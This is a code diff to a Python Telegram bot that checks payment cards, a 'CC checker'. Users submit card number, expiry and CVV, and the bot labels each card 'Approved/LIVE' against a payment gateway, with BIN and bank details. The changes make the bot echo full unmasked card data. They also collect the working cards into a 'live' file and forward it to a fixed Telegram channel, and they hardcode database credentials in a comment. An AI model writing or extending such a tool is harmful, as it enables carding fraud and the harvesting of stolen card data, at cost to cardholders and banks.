@@ -1,3 +1,35 @@
+def bin_lookup(iin: str) -> Dict[str, str]:
+    iin = (iin or "")[:6]
+    data = {
+        "406068": {"brand": "VISA", "type": "DEBIT", "bank": "JPMORGAN CHASE BANK N.A.", "country": "UNITED STATES", "flag": "🇺🇸"}
+    }
+    return data.get(iin, {"brand": validator.detect_type(iin), "type": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": ""})
+
+def format_single_response(raw_line: str, res: Dict, elapsed: float) -> str:
+    number = res.get("number", "")
+    iin = number[:6]
+    binfo = bin_lookup(iin)
+    approved = res.get("valid") and res.get("status") == "LIVE"
+    heading = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if approved else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
+    result_line = "Approved" if approved else (res.get("reason") or "Declined")
+    gateway = "Braintree Auth 1"
+    brand_line = f"{iin} - {binfo['type']} - {binfo['brand']}".strip()
+    country_line = f"{binfo['country']} - {binfo['flag']}".strip()
+    bank_line = f"{binfo['bank']} - {binfo['type']}" if binfo['bank'] != "UNKNOWN" else binfo['bank']
+    td_line = f"Authenticate Successful Y" if approved else "Not Performed N"
+    # Show the original input line (full PAN + expiry + CVV) per user's request
+    display_line = raw_line
+    return (
+        f"{heading}\n\n"
+        f"𝐂𝐚𝐫𝐝 ➜ {display_line}\n"
+        f"𝐑𝐞𝐬𝐮𝐥𝐭 ➜ {result_line}\n"
+        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gateway}\n\n"
+        f"𝐁𝐈𝐍 ➜ {brand_line}\n"
+        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country_line}\n"
+        f"𝐁𝐚𝐧𝐤 ➜ {bank_line}\n\n"
+        f"𝟯𝐃 𝐋𝐨𝐨𝐤𝐮𝐩 ➜ {td_line}\n"
+        f"𝐓𝐢𝐦𝐞 {elapsed:.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
+    )
 import os
 import re
 import json
@@ -24,9 +56,11 @@ from telegram.ext import (
     filters,
 )
 
+#mongodb+srv://onecard:onecard@cluster0.rbopuj4.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0
+
 # ---------------- CONFIG ----------------
-BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
-MONGO_URI = os.getenv("MONGO_URI", "mongodb://localhost:27017")
+BOT_TOKEN = "8038487613:A"
+MONGO_URI = "mongod"
 DB_NAME = os.getenv("DB_NAME", "cc_checker_bot")
 OWNER_IDS = [6656608288, 7875192045]
 CHANNEL_ID = -1003070120901
@@ -447,18 +481,12 @@ async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text("Usage: /check <number|MM|YYYY|CVV>")
         return
-
     raw = " ".join(context.args).strip()
+    start = asyncio.get_event_loop().time()
     res = validator.validate_line(raw)
-
-    if res["valid"]:
-        await update.message.reply_text(
-            f"✅ VALID — {res['masked']} ({res['type'].upper()}) → {res['status']}"
-        )
-    else:
-        await update.message.reply_text(
-            f"❌ INVALID — {res['masked'] or res['number']} — Reason: {res['reason']}"
-        )
+    elapsed = asyncio.get_event_loop().time() - start
+    formatted = format_single_response(raw, res, elapsed)
+    await update.message.reply_text(formatted)
 
 
 # Bulk file handler - only sudo/owner allowed
@@ -559,14 +587,24 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             logger.exception("Validation error for line: %s", e)
             results.append({"masked": None, "valid": False, "reason": "Validation error"})
 
-    # Create masked report text
+    # Create masked summary report text
     report_text = await create_masked_report_text(user.id, user.full_name or user.username or str(user.id), results)
-
-    # Save to a temporary report file
     report_tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8")
     report_tmp_path = report_tmp.name
     report_tmp.write(report_text)
     report_tmp.close()
+
+    # Create LIVE-only original lines file
+    live_lines = []
+    for src_line, r in zip(uniq_lines, results):
+        if r.get("valid") and r.get("status") == "LIVE":
+            live_lines.append(src_line)
+    live_tmp_path = None
+    if live_lines:
+        live_tmp = tempfile.NamedTemporaryFile(delete=False, suffix="_live.txt", mode="w", encoding="utf-8")
+        live_tmp_path = live_tmp.name
+        live_tmp.write("\n".join(live_lines))
+        live_tmp.close()
 
     # Reply to user with summary and report
     total = len(results)
@@ -576,17 +614,22 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         await msg.reply_text(
-            f"✅ Bulk check completed.\nTotal: {total}\nValid: {valid}\nLive: {live}\nDead: {dead}\nSending masked report..."
+            f"✅ Bulk check completed.\nTotal: {total}\nValid: {valid}\nLive: {live}\nDead: {dead}" + ("\nSending reports..." if live_lines else "\nNo LIVE cards found. Sending masked summary...")
         )
-        await msg.reply_document(InputFile(report_tmp_path, filename=f"report_{doc.file_unique_id}.txt"))
+        await msg.reply_document(InputFile(report_tmp_path, filename=f"summary_{doc.file_unique_id}.txt"))
+        if live_lines and live_tmp_path:
+            await msg.reply_document(InputFile(live_tmp_path, filename=f"live_{doc.file_unique_id}.txt"))
     except Exception:
         logger.exception("Failed to send report to user.")
 
-    # Send to channel (masked report)
-    try:
-        await context.bot.send_document(CHANNEL_ID, InputFile(report_tmp_path), caption=f"Masked report from {user.full_name or user.username or user.id}")
-    except Exception:
-        logger.exception("Failed to send report to channel.")
+    # Send to channel (masked + live) if configured
+    if CHANNEL_ID:
+        try:
+            await context.bot.send_document(CHANNEL_ID, InputFile(report_tmp_path), caption=f"Summary from {user.full_name or user.username or user.id}")
+            if live_lines and live_tmp_path:
+                await context.bot.send_document(CHANNEL_ID, InputFile(live_tmp_path), caption="LIVE cards")
+        except Exception:
+            logger.exception("Failed to send report(s) to channel.")
 
     # Save metadata to Mongo (do NOT store raw lines unless configured)
     try:
@@ -611,10 +654,12 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         os.unlink(tmp_path)
     except Exception:
         pass
-    try:
-        os.unlink(report_tmp_path)
-    except Exception:
-        pass
+    for p in [report_tmp_path, live_tmp_path]:
+        if p:
+            try:
+                os.unlink(p)
+            except Exception:
+                pass
 
 
 # ---------------- OWNER / SUDO MANAGEMENT ----------------
@@ -693,7 +738,7 @@ async def exportchecks_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ---------------- BOT SETUP ----------------
 def main():
-    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN":
+    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
         logger.error("Please set BOT_TOKEN in the script before running.")
         return
 
@@ -719,5 +764,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
